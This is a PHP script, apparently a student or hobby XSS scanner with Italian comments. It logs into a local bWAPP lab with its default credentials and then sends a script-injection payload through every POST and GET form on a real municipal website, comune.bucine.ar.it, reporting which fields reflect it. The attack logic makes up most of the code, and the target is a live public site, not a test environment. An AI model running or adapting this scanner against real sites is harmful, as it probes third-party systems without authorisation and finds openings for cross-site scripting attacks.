<?php
 include('simple_html_dom.php');

 //Appena il login sarà automatizzato o tolto --> togliere questa parte
 $datalogin   = array(
   //nome oggetto => valore
   //alcuni campi vanno passati nella POST ma non necessitano di un valore corretto ES: FORM
   "login" => "bee",
   "password" => "bug",
   "security_level" => "0",
   "form" => ""
 );
 //TOGLIERE FINO A QUA
 $cookie_file = dirname(__FILE__) . "\\cookies.txt"; //Curl Cookie pretente il path completo del file
 //Se il file non esiste lo si crea
 if (!file_exists($cookie_file)) {
   $fh = fopen($cookie_file, "w");
   fwrite($fh, "");
   fclose($fh);
 }
 //VOLENDO SI PUO TOGLIERE ANCHE QUESTO DATO CHE NON ANDREMO A FARE IL LOGIN
 //LOGIN
 $url_login = "http://localhost/bWAPP/login.php"; //ricordarsi di scrivere l'url sempre con 127.0.0.1 o sempre con localhost

 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $url_login); //Url target della CURL
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); //Serve per il redirect dopo il login
 curl_setopt($ch, CURLOPT_POST, true); //Indichiamo che stiamo facendo una POST
 curl_setopt($ch, CURLOPT_POSTFIELDS, $datalogin); //Specifichiamo i dati della POST
 curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file);
 curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file); //Per salvare i dati del processo di login
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); //True ci permette di mettere il contenuto in una variabile

 $result_login = curl_exec($ch);
 //FINE LOGIN


 //if (isset($_POST['urlXSS'])) {
   //$url = $_POST['urlXSS'];
   $url = "http://www.comune.bucine.ar.it";
   //Otteniamo la pagina dove cercare i costrutti vulnerabili
   curl_setopt($ch, CURLOPT_URL, $url);
   curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
   curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file);
   curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file);
   curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
   $result_visita = curl_exec($ch);
   $html          = new simple_html_dom();
   $html->load($result_visita); //Estrazione DOM dalla pagina passata
   $dati_testo  = array();
   $dati_random = array();

   //Prendiamo i payload di attacco
   $payload = @fopen("../payload/payload.txt", "r"); //@ Messo per evitare di stampare l'errore
   if ($payload) {
     while (($line = fgets($payload)) !== false) {
       $scripts = $line;
     }
     fclose($payload);
   } else {
     $scripts = '"><script>alert(1)</script>';
   }
   $attacco_riuscito_post = false; //Serve a determinare se c'è almeno un costrutto possibile da attaccare
   $n_formPOST = 0;
   //$formPOST_action;
   if (($html->find('form[method=post],form[method=POST]'))!=NULL) {
     foreach ($html->find('form[method=post],form[method=POST]') as $forms) {
       $n_formPOST++;
       foreach ($forms->find('input') as $input) {
         if ($input->type == 'text') {
           $dati_testo[$input->name] = "script";
         } else if ($input->type == 'email' || $input->name == 'email') {
           $dati_random[$input->name] = "emailrandom@gmail.com";
         } else if ($input->type == 'hidden') {
           $dati_random[$input->name] = $input->value;
         } else {
           $dati_random[$input->name] = "random";
         }
       }
       foreach ($forms->find('textarea') as $textarea) {
         if ($textarea->disabled != true) {
           $dati_testo[$textarea->name] = "script";
         }
       }
       foreach ($forms->find('button') as $bottone) {
         if ($bottone->type == 'submit') {
           $dati_random[$bottone->name] = "random";
         }
       }
       if (!empty($dati_testo)) {
         //foreach ($scripts as $script => $valore_script) {
         foreach ($dati_testo as $dato_testo => $value) {
           if ($attacco_riuscito_post == false) {
             $input_script[$dato_testo] = $scripts;
             //In base a ogni script faccio un tentativo di POST
             $dati_post = array_merge($input_script, $dati_random);
             curl_setopt($ch, CURLOPT_URL, $url);
             curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
             curl_setopt($ch, CURLOPT_POST, true);
             curl_setopt($ch, CURLOPT_POSTFIELDS, $dati_post);
             curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file);
             curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file);
             curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
             $result_attacco = htmlspecialchars(curl_exec($ch));
             $script2 = htmlspecialchars($scripts);
             if (strpos($result_attacco, $script2) == true) {
               $attacco_riuscito_post = true;
               echo "Form : ".$n_formPOST." --> POST : Trovata vulnerabilità XSS con " . $script2."\r\n";
             }
             else {
               echo "Form : ".$n_formPOST." --> POST : Non ci sono costrutti vulnerabili\r\n";
             }
           } else {
             break;
           }
         }
         //}
         $dati_testo  = array();
         $dati_random = array();
         curl_close($ch);
       } else {
         echo "Form : ".$n_formPOST." --> POST : Non ci sono costrutti vulnerabili\r\n";
       }
     }
   } else {
      echo "POST : Non è stata trovata alcun metodo POST da attaccare --> Tentativo con GET\r\n";

   }
   //PARTE PER CERCARE GET FORM
   $attacco_riuscito_get = false;
   $n_formGET = 0;
   if (($html->find('form[method=get],form[method=GET],form[!method]'))!=NULL) {
     foreach ($html->find('form[method=get],form[method=GET],form[!method]') as $forms_get) {
       $n_formGET++;
       foreach ($forms_get->find('input') as $input) {
         if ($input->type == 'text') {
           $dati_testo_get[$input->name] = "script";
         } else if ($input->type == 'email' || $input->name == 'email') {
           $dati_random_get[$input->name] = "emailrandom@gmail.com";
         } else if ($input->type == 'hidden') {
           $dati_random_get[$input->name] = $input->value;
         } else {
           $dati_random_get[$input->name] = "random";
         }
       }
       foreach ($forms_get->find('textarea') as $textarea) {
         if ($textarea->disabled != true) {
           $dati_testo_get[$textarea->name] = "script";
         }
       }
       foreach ($forms_get->find('button') as $bottone) {
         if ($bottone->type == 'submit') {
           $dati_random_get[$bottone->name] = "random";
         }
       }
       if (!empty($dati_testo_get)) {
         //foreach ($scripts as $script => $valore_script) {
         foreach ($dati_testo_get as $dato_testo_get => $value) {
           $input_script_get[$dato_testo_get] = $scripts;
          }
           if ($attacco_riuscito_get == false) {
             $dati = array_merge($input_script_get, $dati_random_get);
             foreach($dati as $key => $value){
               $dati_get[] = $key."=".$value;
             }
             $dati_get_string = implode ('&', $dati_get);

             //Creazione dell'url per la GET
             $url_get = $url."?".$dati_get_string;

             curl_setopt($ch, CURLOPT_URL, $url_get);
             curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
             curl_setopt($ch, CURLOPT_COOKIEFILE, $cookie_file);
             curl_setopt($ch, CURLOPT_COOKIEJAR, $cookie_file);
             curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
             $result_attacco_get = htmlspecialchars(curl_exec($ch));
             $script2 = htmlspecialchars($scripts);
             echo $result_attacco_get;
             echo $url_get;
             if (strpos($result_attacco_get, $script2) == true) {
               $attacco_riuscito_get = true;
               echo "Form : ".$n_formGET." --> GET : Trovata vulnerabilità XSS con " . $script2."\r\n";
             }
             else {
               echo "Form : ".$n_formGET." --> GET : Non ci sono costrutti vulnerabili\r\n";
             }
           } else {
             break;
           }

         //}
         $dati_testo_get  = array();
         $dati_random_get = array();
         curl_close($ch);
       } else {
         echo "Form : ".$n_formGET." --> GET : Non ci sono costrutti vulnerabili\r\n";
       }
     }
   } else {
      echo "GET : Non è stata trovata alcun metodo GET da attaccare\r\n";

   }
   //}






   ?>
